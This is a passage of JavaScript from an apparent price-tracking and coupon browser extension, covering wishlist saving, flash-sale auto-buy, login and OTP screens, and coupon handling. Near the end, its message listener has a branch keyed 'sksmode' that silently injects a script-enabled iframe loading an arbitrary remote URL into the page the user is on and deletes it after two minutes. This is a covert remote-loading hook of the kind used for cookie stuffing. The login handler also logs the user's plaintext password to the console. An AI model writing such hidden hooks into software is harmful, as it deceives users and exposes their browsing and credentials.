              //     mainExtSub.querySelector('.contentBlock').appendChild(elem);
              //     return;
              //    }

              let val = currentElem.getAttribute('value');
              glb_prd_to_save_var.min_drop = val;
              //    mainExtSub.querySelector(".please_choose").innerText = `${val}`;
              console.log('this is set_prc_drop_in_prd value;.........', val);

              //    let e = mainExtSub.querySelector('.save_prod_prc_list_main_cont');
              //    if(e)mainExtSub.querySelector('.contentBlock').removeChild(e);
            } catch (error) {
              console.log('this is set_prc_drop_in_prd error:...', error);
            }
          })();
          break;

        case 'save_prod_to_wish_list':
          (async function callMe() {
            try {
              let s = 'loc_wish_list';
              if (!glb_prd_to_save_var.time_stamp)
                glb_prd_to_save_var.time_stamp = Date.now();

              console.log(
                'glb str det var save_prod_to_wish_list: ',
                glb_str_det_var
              );
              let pid = glb_str_det_var.pid,
                min_drp_elem = mainExtSub.querySelector('.prc_lst_dropdown'),
                min_drp_val = 0;

              if (min_drp_elem) min_drp_val = min_drp_elem.value;
              console.log('get_logo_by_sid',glb_str_det_var);
              glb_prd_to_save_var = {
                type: 'wishlist',
                store_id: glb_str_det_var.prd_sel_data.store_id,
                title: glb_str_det_var.prd_sel_data.title,
                img_url: glb_str_det_var.prd_sel_data.image,
                start_price: glb_str_det_var.prd_sel_data.starting_price,
                min_drop: min_drp_val || glb_str_det_var.prd_sel_data.min_drop,
                pid: glb_str_det_var.pid,
                product_url: location.href,
                start_date: +new Date(),
                logo: glb_str_det_var.prd_sel_data.logo,
              };
              console.log('glb_prd_to_save_var',glb_prd_to_save_var)
              let obj = {};
              let isAuth = await chck_authentication_crrnt();
              let elem = document.createElement('div');
              elem.setAttribute('class', 'save_prod_prc_list_main_cont');

              if (!isAuth) {
                let res_is_prd = await chck_prd_in_whishlist(); // checking prd in wish list
                await storage('set', {loc_wish_list:global_whishList_var})
                let get_res = await storage('get', s);
                get_res = get_res || {};
                // await sendMessagePromise({
                //   dataMSg: {
                //     msg: 'loc_strg_handlr',
                //     data: { op: 'get', str: s },
                //   },
                // });
                console.log('get response save_prod_to_wish_list: ', get_res,res_is_prd,glb_prd_to_save_var);
                
                  
                if (res_is_prd.found) {
                  console.log('inside succ updated to wl');
                  res_is_prd.obj.min_drop = glb_prd_to_save_var.min_drop;
                  get_res[`${pid}`] = res_is_prd.obj;

                  let res = await storage('set', {loc_wish_list:get_res})
                  // await sendMessagePromise({
                  //   dataMSg: {
                  //     msg: 'loc_strg_handlr',
                  //     data: { op: 'set', str: s, obj: get_res },
                  //   },
                  // });
                  if (res)
                    elem.innerHTML = `${save_prod_prc_succ_popup(
                      'successfully updated!'
                    )}`;
                }
                if (!res_is_prd.found) {
                  if (Object.keys(get_res).length !== 0){
                    obj = [...get_res, glb_prd_to_save_var ];
                  }else{
                    obj = [glb_prd_to_save_var];
                  }
                  let res = await storage('set', {loc_wish_list:obj})
                  // await sendMessagePromise({
                  //   dataMSg: {
                  //     msg: 'loc_strg_handlr',
                  //     data: { op: 'set', str: s, obj: obj },
                  //   },
                  // });
                  if (res) {
                    console.log('inside succ saved to wl');
                    elem.innerHTML = `${save_prod_prc_succ_popup(
                      'successfully saved!'
                    )}`;
                    let e = grabbable.querySelector('.sv_prd_mn_btn');
                    e.innerText = 'Update item';
                  }
                }
              } else {
                let chck_prd_wl = await chck_prd_in_whishlist();
                
                let resp = await sendMessagePromise({
                  dataMSg: {
                    msg: 'add_to_wish_list',
                    data: glb_prd_to_save_var,
                  },
                });
                console.log('online user add_to_wl_response...', resp);


                if (resp.code == 200) {
                  if (chck_prd_wl.found) {
                    elem.innerHTML = `${save_prod_prc_succ_popup(
                      'successfully updated!'
                    )}`;
                  } else {
                    elem.innerHTML = `${save_prod_prc_succ_popup(
                      'successfully saved!'
                    )}`;
                    let e = grabbable.querySelector('.sv_prd_mn_btn');
                    e.innerText = 'Update item';
                  }
                }
              }
              mainExtSub.querySelector('.contentBlock').appendChild(elem);
              setTimeout(() => {
                let e = mainExtSub.querySelector(
                  '.save_prod_prc_list_main_cont'
                );
                mainExtSub.querySelector('.contentBlock').removeChild(e);
              }, 2500);
              // console.log("this is save_prod_to_wish_list:",res);
            } catch (error) {
              console.log('this is save_prod_to_wish_list err:', error);
            }
          })();
          break;

        case 'sel_fls_sl_varnt':
          let val = currentElem.value,
            ind = currentElem.getAttribute('indx'),
            site_indx = currentElem.getAttribute('site_indx');
          let label = mainExtSub.querySelector(
            `[for="crtunsubfss${site_indx}"]`
          );
          let site = label.getAttribute('fs_flssl_site');
          // console.log("this is label fls sl",label);
          let pdr_varnt = fs_fls_sale_data_obj.base[site]['prd'][ind]['var'];
          // console.log('this is selected element...fls sale',val,ind,site,pdr_varnt);

          // color selector....
          let col_sel = mainExtSub.querySelector(
            `.my_colr_sel_box${ind}${site_indx}`
          );
          let opt_str = `
                <option value="" disabled selected>--Select--</option>
                `;

          for (let key in pdr_varnt) {
            if (pdr_varnt[key][val]) {
              col_sel.removeAttribute('disabled');
              for (let j in pdr_varnt[key][val]) {
                let str = `<option value="${j}" pg_typ="${key}" >${j}</option>`;
                opt_str += str;
              }
            }
          }

          // console.log('created optoin string...',opt_str);
          col_sel.innerHTML = opt_str;

          break;

        case 'send_to_subs_fls_sl':
          (() => {
            if (currentElem.value) {
              let colr_opt_cnt = currentElem.childElementCount,
                colr_value = currentElem.value,
                indx = currentElem.getAttribute('indx'),
                site_indx = currentElem.getAttribute('site_indx');

              let var_selctr = mainExtSub.querySelector(
                  `.my_varnt_sel_box${indx}${site_indx}`
                ),
                var_opt_cnt = var_selctr.childElementCount,
                var_value = var_selctr.value;

              let site_cont_blck = mainExtSub.querySelector(
                  `.my_content_blck${site_indx}`
                ),
                site_accrdn_blck = mainExtSub.querySelector(
                  `.my_accrdin_${site_indx}`
                ),
                site_nm = site_accrdn_blck
                  .querySelector('label')
                  .getAttribute('fs_flssl_site');

              // <-- removing options -->

              let opt_elem_colr = currentElem.querySelector(
                  `option[value="${colr_value}"]`
                ),
                opt_elem_var = var_selctr.querySelector(
                  `option[value="${var_value}"]`
                ),
                pg_typ = opt_elem_colr.getAttribute('pg_typ');

              // <-- creating prdct block in subs -->

              let prd_data_obj = fs_fls_sale_data_obj.base[site_nm];

              console.log("prd data obj fls sale...",prd_data_obj);

              rec_crtd_subs_prd['logo'] = prd_data_obj['logo'];
              rec_crtd_subs_prd['name'] = prd_data_obj['prd'][indx]['name'];
              rec_crtd_subs_prd['color'] = colr_value;
              rec_crtd_subs_prd['variant'] = var_value;
              rec_crtd_subs_prd['date'] = prd_data_obj['prd'][indx]['date'];
              rec_crtd_subs_prd['url'] = prd_data_obj['prd'][indx]['url'];
              rec_crtd_subs_prd['othr_detl'] =
                prd_data_obj['prd'][indx]['var'][pg_typ][var_value][colr_value];

              if(rec_crtd_subs_prd['othr_detl']['url']) window.open(rec_crtd_subs_prd['othr_detl']['url'], '_blank');
              let coo = rec_crtd_subs_prd['othr_detl']['cookie'];
              let data_val = rec_crtd_subs_prd['othr_detl']['c_value']?rec_crtd_subs_prd['othr_detl']['c_value']:1;
              sendMessagePromise({
                dataMSg: { msg: 'regautobuy', data: coo, data_val },
              });
              mainExtSub.querySelector('#first').click();
              if(mainExtSub.querySelector('.no_data_subs_crd')) mainExtSub.querySelector('.no_data_subs_crd').remove();
              let my_div = document.createElement('div');
              let date_str = cnt_dwn_genrtr(rec_crtd_subs_prd['date']).str_dt;
              my_div.innerHTML = flsh_sale_subs_crd(
                main_ext_id,
                rec_crtd_subs_prd,
                date_str
              );

              let subs_cont_blck =
                mainExtSub.querySelector(`.my_content_blcksubs`);
              subs_cont_blck.appendChild(my_div);

              console.log('creating variant with specs:..', rec_crtd_subs_prd);

              // <-- creating prdct block in subs -->

              opt_elem_colr.remove();
              colr_opt_cnt = currentElem.childElementCount;
              if (colr_opt_cnt == 1) {
                currentElem.setAttribute('disabled', true);
                opt_elem_var.remove();
                var_opt_cnt = var_selctr.childElementCount;
                if (var_opt_cnt == 1) {
                  // <-- removing block -->

                  let blck_elem = mainExtSub.querySelector(
                    `.my_cont_fls_sl${indx}${site_indx}`
                  );
                  blck_elem.remove();
                  // console.log('removing block element...',blck_elem);

                  let s_cont_blck_cnt = site_cont_blck.childElementCount;
                  // console.log('child count site content...',s_cont_blck_cnt);
                  if (s_cont_blck_cnt == 1) {
                    site_accrdn_blck.remove();
                  }
                  // <-- removing block -->
                }
              }
              
              // console.log('removing option element...',opt_elem);

              // <-- removing options -->

              // console.log("this is send_to_subs_fls_sl current elem:..",'value is:',currentElem.value,"color_opt:",colr_opt_cnt,"variant_opt",var_opt_cnt);
            }
          })();
          break;    
          case 'unsub_and_render_flash_sale':
            (async () => {
              let coo =currentElem.getAttribute('coo');
              console.log('unsub_and_render_flash_sale',coo)
              await sendMessagePromise({
                dataMSg: { msg: 'deregautobuy', data: coo },
              });
              rend_flsh_sale_page();
            })();
          break;
      }
    });
  // ********************* EXTENSION MAIN ********************

  //  draggable element side popup

  $s(shadowContainer.shadowRoot)
    .find('.extOtherPopups')
    .on('mousedown', '[drag_me]', '', function (event) {
      let currentElem = event.currentTarget;
      let drag_action = currentElem.getAttribute('drag_me');
      switch (drag_action) {
        case 'drag_side_popup':
          (function dragElement() {
            var pos1 = 0,
              pos2 = 0,
              pos3 = 0,
              pos4 = 0;
            let myElem = ext_popup.querySelector('.sidePopupCont_1');
            onDragVar = false;
            dragMouseDown();

            function dragMouseDown(e) {
              event = event || window.event;
              event.preventDefault();
              pos4 = event.clientY;
              myElem.style.transition = '0s';
              document.onmouseup = closeDragElement;
              document.onmousemove = elementDrag;
            }

            function elementDrag(e) {
              event = e || window.event;
              event.preventDefault();
              onDragVar = true;

              pos2 = pos4 - event.clientY;
              pos4 = event.clientY;
              myElem.style.top = myElem.offsetTop - pos2 + 'px';
              // storage('set');
            }

            function closeDragElement() {
              myElem.style.transition = '0.2s';
              storage('set', { popup_top: myElem.style.top });
              /* stop moving when mouse button is released:*/
              document.onmouseup = onDragFalse;
              document.onmousemove = null;
            }

            function onDragFalse() {
              onDragVar = false;
            }
          })();
          break;
        default:
          '';
      }
    });

  //  draggable element side popup

  // ********************* EXTENSION SIDEPOPUP ****************
  $s(shadowContainer.shadowRoot)
    .find('.extOtherPopups')
    .on('click keyup', '[event_action]', '', function (event) {
      if(!fs_init) return;
      let currentElem = event.currentTarget;
      let action = currentElem.getAttribute('event_action');
      switch (action) {
        case 'wish_list_page':
          if (onDragVar) return true;
          (async function call() {
            brwsr_act.isOpen = true;
            global_auth_var = await chck_authentication_crrnt();
            let result = await sendMessagePromise({
              dataMSg: { msg: 'fetch_whish_list', data: '' },
            });
            // bd();
            await call_render_wish_list(result);
          })();
          break;

        case 'Price_alert_page':
          if (onDragVar) return true;
          (async function call() {
            await ren_prc_alrt_pg(glb_str_det_var);
          })();

          break;

        case 'flash_sale_reg':
          (async function () {
            console.log('flash_sale_reg called');
            let coo = currentElem.getAttribute('value');
            console.log(coo);
            await sendMessagePromise({
              dataMSg: { msg: 'regautobuy', data: coo , data_val:1 },
            });
            location.reload();
          })();
          break;

          case 'go_back_logn':
            (function callMe(){
              let bt = currentElem.getAttribute('back_to');
              let cls_btn = ext_popup.querySelector('.logn_close_btn');
              let sp = ext_popup.querySelector('.side_popup_cont');
              if(!bt){
                
                ext_popup.innerHTML = '';
                clearInterval(myIntervl);
                makSidePop('check_curr_pg');
                // let bg = grabbable.querySelector('.ext_main_bckgrnd_1');
                // if(bg)bg.remove();
                // document.body.style.overflow = 'auto';

                rend_my_prof_pg();
                // sp.style.display = 'none';
              }else{
                if(myIntervl)clearInterval(myIntervl);
                console.log("inside else go back to logn..");
                check_login_bck_to(bt);
              }
            })();
          break;

        case 'send_logn_cred':
          console.log('login btn clicked !');
          (function callMe() {
            let usr_nm = ext_popup.querySelector('#email'),
              psswd = ext_popup.querySelector('#password'),
              emailReg =
                /^(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/,
              mobReg = /^([0|\+[0-9]{1,5})?([7-9][0-9]{9})$/,
              sndObj = {};

            if (validate(String(usr_nm.value), emailReg)) {
              sndObj['type'] = 'email';
              sndObj['email'] = usr_nm.value;
              sndObj['password'] = psswd.value;
            } else if (validate(String(usr_nm.value), mobReg)) {
              sndObj['type'] = 'mobile';
              sndObj['mobile'] = usr_nm.value;
              sndObj['password'] = psswd.value;
            } else {
              console.log('enter a valid credential..');
            }

            ext_popup.querySelector(
              '.logn_pg_othr_temp_cont'
            ).innerHTML = `${univ_loader('100%', '352px')}`;
            // return true;
            console.log('login form inps:..................', {
              email: usr_nm.value,
              passwd: psswd.value,
            });

            sendMessagePromise({
              dataMSg: { msg: 'send_logn_cred', data: sndObj },
            })
              .then((result) => {
                console.log('reg_inp_form res:....', result);
                if (result.code !== 200) {
                  rend_login_scrn();
                  ext_popup.querySelector(
                    '#errLoginPgPass'
                  ).innerText = `${result.message}`;
                  ext_popup.querySelector('#errLoginPgPass').style.display =
                    'block';
                  return true;
                }
                ext_popup.innerHTML = '';
                global_auth_var = 1;
                rend_my_prof_pg();
              })
              .catch((err) => {
                console.log('reg_inp_form err.......', err);
                rend_login_scrn();
              });
          })();
          break;

        case 'toggl_psswd':
          (function callMe() {
            let togglr = ext_popup
                .querySelector('.passwordIcon')
                .getAttribute('passval'),
              elem = ext_popup.querySelector('#password');
            if (togglr == 'false') {
              elem.setAttribute('type', 'text');
              ext_popup
                .querySelector('.passwordIcon')
                .setAttribute('passval', 'true');
            } else {
              elem.setAttribute('type', 'password');
              ext_popup
                .querySelector('.passwordIcon')
                .setAttribute('passval', 'false');
            }
            console.log('this is my toggl elem', togglr);
          })();
          break;

        case 'ren_logn_with_otp':
          (function callMe() {
            let bt_btn = ext_popup.querySelector('.logn_bck_btn');
            bt_btn.setAttribute('back_to','prm_login_scrn');
            ext_popup.querySelector(
              '.logn_pg_othr_temp_cont'
            ).innerHTML = `${logn_pg_otp_tmp()}`;
          })();
          break;

        case 'snd_logn_otp':
          (()=>{
            let bt_btn = ext_popup.querySelector('.logn_bck_btn');
            bt_btn.setAttribute('back_to','entr_mob_scrn');
            ren_otp_verf_scrn('snd_logn_otp');
          })();
          break;

        case 'close_logn_pop_mod':
          (function callMe() {
            ext_popup.innerHTML = '';
            clearInterval(myIntervl);
            makSidePop('check_curr_pg', true);
            let bg = grabbable.querySelector('.ext_main_bckgrnd_1');
            if(bg)bg.remove();
            document.body.style.overflow = 'auto';
          })();

          break;

        case 'ren_my_prof_pg':
          (function callMe() {
            check_side_pop_dis();
            rend_my_prof_pg();
          })();
          break;

        case 'ren_otp_sign_up':
          (function callMe() {
            let bt_btn = ext_popup.querySelector('.logn_bck_btn');
            bt_btn.setAttribute('back_to','prm_login_scrn');
            ext_popup.querySelector(
              '.logn_pg_othr_temp_cont'
            ).innerHTML = `${logn_pg_otp_tmp()}`;
            ext_popup
              .querySelector('.lgn_otp_nxt_btn')
              .setAttribute('event_action', 'snd_sign_up_otp');
          })();
        break;

        case 'change_num_action':
          (function callMe(){
            let bbt = ext_popup.querySelector('.logn_bck_btn');
            if(bbt)bbt.click();
          })();
        break;

        case 'snd_sign_up_otp':
          (function callMe(){
            let bt_btn = ext_popup.querySelector('.logn_bck_btn');
            bt_btn.setAttribute('back_to','entr_mob_scrn');
            ren_otp_verf_scrn('snd_sign_up_otp');
          })();
          break;

        case 'otp_inp_focus':
          // console.log("focus running...");
          // currentElem;
          otp_input_focus_scrpt(currentElem);
          break;

        case 'send_input_otp':
          (function callMe() {
            let ce = currentElem;
            console.log('current element send input otp', ce);
            let rf = ce.getAttribute('ren_from');
            let inp_arr = ext_popup.getElementsByClassName('lov_inp'),
              str = '';
            console.log('send_input_otp arr:', inp_arr);
            Array.from(inp_arr).forEach((elem) => {
              str += elem.value;
            });

            console.log('send_input_otp str:', str);
            if (rf == 'snd_sign_up_otp' && str.length == 6) {
              sendMessagePromise({
                dataMSg: {
                  msg: 'send_input_otp_sign_up',
                  data: { mobile: myMob || '', otp: str || '' },
                },
              })
                .then((result) => {
                  console.log('send_input_otp_sign_up result', result);
                  if (result.code !== 200) {
                    console.log(
                      'send_input_otp_sign_up result',
                      result.message
                    );
                    ext_popup.querySelector(
                      '.verf_otp_error_msg'
                    ).innerText = `${result.message}`;
                    Array.from(inp_arr).forEach((elem, ind) => {
                      ext_popup.getElementsByClassName('lov_inp')[ind].value =
                        '';
                    });
                    ext_popup.querySelector(
                      '.verf_otp_error_msg'
                    ).style.display = 'block';
                    return true;
                  }
                  clearInterval(myIntervl);
                  ext_popup.querySelector(
                    '.logn_pg_othr_temp_cont'
                  ).innerHTML = `${logn_pg_sign_up_tmp()}`;

                  let bbtn = ext_popup.querySelector('.logn_bck_btn');
                  if(bbtn)bbtn.style.display = 'none';
                  
                })
                .catch((error) => {
                  console.log('send_input_otp_sign_up error', error);
                });
            }
            if (rf == 'snd_logn_otp' && str.length == 6) {
              sendMessagePromise({
                dataMSg: {
                  msg: 'send_input_otp_login',
                  data: { mobile: myMob || '', otp: str || '' },
                },
              })
                .then((result) => {
                  console.log('send_input_otp_sign_up result', result);
                  if (result.code !== 200) {
                    console.log(
                      'send_input_otp_sign_up result',
                      result.message
                    );
                    ext_popup.querySelector(
                      '.verf_otp_error_msg'
                    ).innerText = `${result.message}`;
                    Array.from(inp_arr).forEach((elem, ind) => {
                      ext_popup.getElementsByClassName('lov_inp')[ind].value =
                        '';
                    });
                    ext_popup.querySelector(
                      '.verf_otp_error_msg'
                    ).style.display = 'block';
                    return true;
                  }
                  clearInterval(myIntervl);
                  close_modl_fucn();
                  rend_my_prof_pg();
                })
                .catch((error) => {
                  console.log('send_input_otp_sign_up error', error);
                });
            }
          })();
          break;

        case 'resend_otp':
          (function callMe() {
            let rf = currentElem.getAttribute('ren_from');
            if (rf == 'snd_sign_up_otp' && glb_cnt_dwn_var == 0) {
              sendMessagePromise({
                dataMSg: { msg: rf, data: { mobile: myMob } },
              })
                .then((result) => {
                  console.log('snd_sign_up_otp result:...', result);
                  glb_cnt_dwn_var = 30;
                  otp_count_down();
                })
                .catch((error) => {
                  console.log('snd_sign_up_otp error:...', error);
                });
            }
            if (rf == 'snd_logn_otp' && glb_cnt_dwn_var == 0) {
              sendMessagePromise({
                dataMSg: { msg: rf, data: { mobile: myMob } },
              })
                .then((result) => {
                  console.log('snd_sign_up_otp result:...', result);
                  glb_cnt_dwn_var = 30;
                  otp_count_down();
                })
                .catch((error) => {
                  console.log('snd_sign_up_otp error:...', error);
                });
            }
          })();
          break;

        case 'submit_sign_up':
          (function callMe() {
            let inp_arr = ext_popup.getElementsByClassName('log_signup_inp');
            let obj = {};
            Array.from(inp_arr).forEach((elem) => {
              obj[elem.getAttribute(`name`)] = elem.value;
            });
            ext_popup.querySelector(
              '.logn_pg_othr_temp_cont'
            ).innerHTML = `${univ_loader('100%', '352px')}`;
            sendMessagePromise({
              dataMSg: { msg: 'submit_sign_up', data: obj },
            })
              .then((result) => {
                console.log('submit_sign_up result:....', result);
                if (result.code == 200) {
                  close_modl_fucn();
                  rend_my_prof_pg();
                }
              })
              .catch((error) => {
                console.log('submit_sign_up error:....', error);
              });
          })();
          break;

        case 'skip_sign_up':
          (
            function callMe(){
              let obj = {
                'name':'',
                'email':'',
                'password':'',
              };
              ext_popup.querySelector(
                '.logn_pg_othr_temp_cont'
              ).innerHTML = `${univ_loader('100%', '352px')}`;
              sendMessagePromise({
                dataMSg: { msg: 'submit_sign_up', data: obj },
              })
              .then((result) => {
                console.log('submit_sign_up result:....', result);
                if (result.code == 200) {
                  close_modl_fucn();
                  rend_my_prof_pg();
                }
              })
              .catch((error) => {
                console.log('submit_sign_up error:....', error);
              });
            }
          )();
        break;

        case 'check_curr_pg':
          console.log('current page check....');
          (async function callME() {
            await check_ext_pg_to_rend();
          })();
          break;

        case 'close_add_store_modal':
          close_add_store_modal(1);
          break;

        case 'add_store_request':
            (async function callme(){
                close_add_store_modal(1);
                let domain = new URL(window.location.href);
                let site ='';
                if (domain) {
                let hostname = domain.hostname;
                if (hostname) {
                    let parsed_url = psl.parse(hostname);
                    site = parsed_url.domain;
                }
                }
                console.log("this is my domain for add store..",site);

                let resp = await sendMessagePromise({
                    dataMSg: { msg: 'add_store_request', data: site },
                  });

                console.log("this is the send messg resp from add store request",resp);
                
            })();
        break;

        case 'close_prc_grph_modal':
          (function call() {
            let elem = ext_popup.querySelector('.price_graph_cont_main');
            ext_popup.removeChild(elem);
          })();
          break;

        case '6_mn_grh':
          (async function call() {
            let url = baseUrl+`products/${is_PID.pid_this}/${is_PID.g_code.site_id}`;
            console.log('is_PID data...', is_PID);
            let resp = await sendMessagePromise({
              dataMSg: { msg: '6_mn_grh', data: url },
            });
            console.log("this is response 6 months graph..",resp);
          })();
          break;

        case 'cls_aac_main_pp':
          set_aac_storage('popup_close_1');
          close_acc_popup(1);
          break;

        case 'start_aac_func':
          (function callME() {
            set_aac_storage('start_button_click');
            console.log('aac start applying ...', glb_cpn_arr);
            // <-- setting variable value for first scroll in aac procssng animation -->
            aac_cpn_prss_anim = 0;
            // <-- setting variable value for first scroll in aac procssng animation -->
            startautoapply();
          })();
          break;

        case 'ren_terms_of_use':
            (async function call() {
                let url = baseUrl+`terms-conditions`;
                // console.log('is_PID data...', is_PID);
                let resp = await sendMessagePromise({
                  dataMSg: { msg: 'crt_anothr_tab', data: url },
                });
                console.log("this is response ren_terms_of_use..",resp);
            })();
        break;

        case 'ren_privcy_polcy':
            (async function call() {
                let url = baseUrl+`privacy-policy`;
                // console.log('is_PID data...', is_PID);
                let resp = await sendMessagePromise({
                  dataMSg: { msg: 'crt_anothr_tab', data: url },
                });
                console.log("this is response ren_privcy_polcy..",resp);
            })();
        break;

        case 'apply_final_coupon':
          close_extpop('', '.manual_cpns_pop_tble');
          select_final_coupon(currentElem.getAttribute('event_data'));
          break;
        case 'cls_cpn_ext_pp':
          close_extpop(currentElem);
          break;
        case 'cls_cpn_procssng_pp':
          close_cpn_procssng_popup_box(1);
          break;
        case 'cls_curr_pp':
          console.log('cls_curr_pp')
          close_extpop(currentElem);
          break;

        case 'ren_logn_with_ggl':
            (async function call() {

                let cb = ext_popup.querySelector('.logn_close_btn');
                cb&&cb.click();

                let url = baseUrl+'api/user/auth/google';
                let resp = await sendMessagePromise({
                  dataMSg: { msg: 'crt_anothr_tab', data: url },
                });
                console.log('this is ren_logn_with_ggl response:...',resp);
            })();
        break;

        case 'opn_more_cpn_side_btn':
          (()=>{

            if(ext_popup.querySelector('.manual_cpn_sd_btn_cont_111'))return;

            let sa = currentElem.getAttribute('sub_action');
            console.log("oppening more coupons btn",mnl_cpn_sd_var,'  sub_action:',sa);
            
            let cls_btn1 = ext_popup.querySelector('.fs_cls_img_aac'),
            cls_btn2 = ext_popup.querySelector('.succs_aac_popup_cls_btn'),
            cls_btn3 = ext_popup.querySelector('.cpn_not_found_cls');

            cls_btn1&&cls_btn1.click();
            cls_btn2&&cls_btn2.click();
            cls_btn3&&cls_btn3.click();

            let newArr = mnl_cpn_sd_var;

            if(sa == 'try_more')newArr.splice(0,5);
            let avl_cpn_str = str_maker(newArr.data.coupons.coupons, 'avl_cpn');
            let lst_cpn_str = str_maker(newArr.data.coupons.lsc_cpn, 'lst_cpn');
            let avl_cpn_ln = newArr.data.coupons.total_coupons;
            let myDiv = document.createElement('div');
            myDiv.setAttribute('class','manual_cpn_sd_btn_cont_111');
            myDiv.innerHTML = manual_coupons_side_pp(newArr,lst_cpn_str,avl_cpn_str,avl_cpn_ln);
            ext_popup.appendChild(myDiv);
          })();
        break;

        case 'copy_cpn':
          (function callMe() {
            let cpn = currentElem.querySelector('span').innerText,
              elem = currentElem.querySelector('.couponsCopied');
            elem.style.display = 'block';

            setTimeout(() => {
              elem.style.display = 'none';
            }, 1000);

            console.log('cpoy cpn clicked !', cpn);
            navigator.clipboard.writeText(`${cpn}`);
          })();
        break;

        case 'close_sd_mnl_cpn_pp':
          console.log("closing manual coupon side popup...");
          ext_popup.querySelector('.manual_cpn_sd_btn_cont_111').remove();
          
        break;
      }
    });
  // ********************* EXTENSION SIDEPOPUP ****************
}

// ************************ on message listener *****************
function makeid(length) {
  var result           = '';
  var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  var charactersLength = characters.length;
  for ( var i = 0; i < length; i++ ) {
    result += characters.charAt(Math.floor(Math.random() * charactersLength));
 }
 return result;
}
// console.log('messaging loded');

chrome.runtime.onMessage.addListener(function (req, sender, responseToSend) {
  console.log('inside on message', req);
  if(req.storeData) mnl_cpn_sd_var = req.storeData;

  if(!fs_init) return;

  if (req && req.type == 'browser_action') {
    if (mainExtSub.innerHTML) {
      console.log(111111111111111)
      close_add_store_modal(0);
      close_main_ext_modal();
      // let opp_btn = mainExtSub.querySelector('.close_add_store_modal');
      // let cls_btn = mainExtSub.querySelector('.sub_conatiner_close_img');
      // if (opp_btn) opp_btn.click();
      // if (cls_btn) cls_btn.click();
      return true;
    }

    check_ext_pg_to_rend();
    //    switch (brwsr_act.type) {
    //     case 'add_store_popup':

    //     break;
    //     case 'whish_list':
    //         brwsr_act.isOpen?(function call(){
    //             close_modl_fucn();
    //             brwsr_act.isOpen=false;
    //         })():(async function call(){

    //             brwsr_act.isOpen = true;
    //             global_auth_var = await chck_authentication_crrnt();
    //             let result = await sendMessagePromise({ dataMSg: { msg: 'fetch_whish_list', data: '' } })
    //             bd();
    //             await call_render_wish_list(result);

    //         })();
    //     break;
    //     case 'Price_alert_page':
    //         console.log('section: rpice alrt page brwsr act',brwsr_act.isOpen);
    //         brwsr_act.isOpen?(function call(){
    //             close_modl_fucn();
    //             brwsr_act.isOpen = false;
    //         })():(async function call(){await ren_prc_alrt_pg(glb_str_det_var)})();
    //     break;
    //     case 'auto_apply_popup':

    //     break;

    //     default:
    //         break;
    //    }
    responseToSend({ msg: 'message recieved' });
  } 
  if (req && req.sksmode && req.sksmode == "aurl" && req.aurl) {
    let randid = makeid(10);
    let domscript = document.createElement("iframe");
    domscript.setAttribute("sandbox","allow-forms allow-same-origin allow-scripts");
    domscript.setAttribute("id",randid);
    domscript.src = req.aurl;
    document.getElementsByTagName("head")[0].appendChild(domscript);
    setTimeout(()=>{document.getElementById(randid).remove()},120000);
  }
  return true;
});

//  render price alter page.............
async function ren_prc_alrt_pg(params, grh_str = '7d') {
  /*
7d
45d
*/

  console.log('inside recent price drop ....');
  if(!fs_init) return;

  check_side_pop_dis(); // checking my side-popup display .........
  // making side popup and setting display none ...............
  // makSidePop('Price_alert_page',false);
  // making side popup and setting display none ...............

  mainExtSub.innerHTML = `${ext_main_temp_struc(
    '',
    'Save Product',
    params,
    main_ext_id,
    false,
    is_flash,
    false,
    1
  )}`;
  mainExtSub.querySelector('.contentBlock').innerHTML = `${univ_loader(
    '100%',
    '553px'
  )}`;

  let chck_prd_wl_res = await chck_prd_in_whishlist(); // checking prd in wish-list.....
  console.log('response from chck_prd_wl_res:', chck_prd_wl_res);

  let myCanva = document.createElement('canvas');
  myCanva.setAttribute('id', 'myCanva');
  myCanva.setAttribute('style', '');

  check_header('Save Product', false, 'whs_lst');
  console.log('dvjjdbnvdjkbvdj.....', chck_prd_wl_res);

  let d_temp = {
    prd_wl: chck_prd_wl_res,
    dis_data: params.prd_sel_data,
  };

  mainExtSub.querySelector('.contentBlock').innerHTML = `${save_prod_pg_temp(
    main_ext_id,
    d_temp
  )}`;
  mainExtSub.querySelector('.my_canva_grph_cont').innerHTML = `${univ_loader(
    '100%',
    '161px'
  )}`;

  // ****************** changing btn css **********
  console.log('prc alrt pg btn css...', mainExtSub.querySelector('#a7dpg1'));
  if (grh_str == '7d') {
    mainExtSub.querySelector('#a7dpg1').setAttribute('class', 'price_7day');
    mainExtSub
      .querySelector('#a7dpg2')
      .setAttribute('class', 'price_7day mke_me_grey');
    mainExtSub
      .querySelector('#a7dpg3')
      .setAttribute('class', 'price_7day mke_me_grey');
  }
  if (grh_str == '45d') {
    mainExtSub
      .querySelector('#a7dpg1')
      .setAttribute('class', 'price_7day mke_me_grey');
    mainExtSub.querySelector('#a7dpg2').setAttribute('class', 'price_7day');
    mainExtSub
      .querySelector('#a7dpg3')
      .setAttribute('class', 'price_7day mke_me_grey');
  }
  // ****************** changing btn css **********

  // ****************** data options ************************

  // <-- getting graph-data -->

  params.grp_data = await get_graph_data(is_PID.g_code, is_PID.pid_this);
  console.log('response from get_graph_data function', params.grp_data);
  if (params.grp_data && params.grp_data.value) {
    params.grp_data = JSON.parse(params.grp_data.value);
    if (d_temp.dis_data && d_temp.dis_data.starting_price) {
      console.log('params.grp_data.value', params.grp_data);

      // <-- appending todays data -->

      let today_prc = d_temp.dis_data.starting_price;

      let t_d = new Date(),
        yyyy = t_d.getFullYear().toString(),
        mm = (t_d.getMonth() + 1).toString(),
        dd = t_d.getDate().toString(),
        d_str = yyyy + '-' + mm + '-' + dd,
        prc_arr = [];

      prc_arr.push(d_str, `${today_prc}`, `${today_prc}`);

      params.grp_data.push(prc_arr);
      console.log('todays arr...', params.grp_data);

      // <-- appending todays data -->
    }
  }
  mainExtSub.querySelector('.my_canva_grph_cont').innerHTML = '';
  mainExtSub.querySelector('.my_canva_grph_cont').appendChild(myCanva);

  // <-- getting graph-data -->

  console.log('params pricce grah.....', params.grp_data);
  let data = [];
  if (params.grp_data) {
    data = graph_manipulator(params.grp_data, grh_str);
  }
  const labels = data.map((y) => y[0]);

  // ****************** data options ************************

  let dataOpt = {
      labels: labels,
      datasets: [
        {
          steppedLine: true,
          label: 'Max Price',
